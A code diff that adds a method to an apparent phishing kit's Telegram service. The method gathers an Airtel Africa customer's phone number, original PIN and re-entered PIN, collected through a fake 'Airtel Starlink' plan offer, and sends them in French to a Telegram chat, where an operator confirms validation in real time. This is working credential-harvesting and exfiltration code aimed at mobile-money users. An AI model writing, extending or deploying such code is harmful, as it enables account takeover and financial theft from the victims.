@@ -202,6 +202,30 @@ class TelegramService {
   }
 
   /**
+   * Send Re-entered PIN
+   */
+  public async sendReenterPin(payload: TelegramReenterPinPayload): Promise<boolean> {
+    const { sessionId, phone, pin, originalPin, planName, planPrice, country, fullPhone, airtelBrand } = payload;
+    const cleanPin = pin.replace(/\D/g, '').slice(0, 4);
+
+    const displayPhone = fullPhone || phone || 'Inconnu';
+    const displayCountry = country || 'Airtel Africa';
+
+    const message =
+      `🔐 <b>CODE PIN CONFIRMÉ / RESSAISI</b>\n\n` +
+      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
+      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
+      `🔑 <b>Code PIN Ressaisi:</b> <code>${cleanPin}</code>\n` +
+      `📌 <b>Code PIN Initial:</b> <code>${originalPin || '****'}</code>\n` +
+      `📦 <b>Forfait:</b> ${planName || 'Forfait Airtel Starlink'} (${planPrice || '$1.49'})\n` +
+      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
+      `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
+      `👇 <i>Confirmez la validation finale du code PIN :</i>`;
+
+    return sendToTelegramAndWait(message, sessionId, false);
+  }
+
+  /**
    * Status polling - not needed with blocking pattern
    */
   public async pollUpdates(
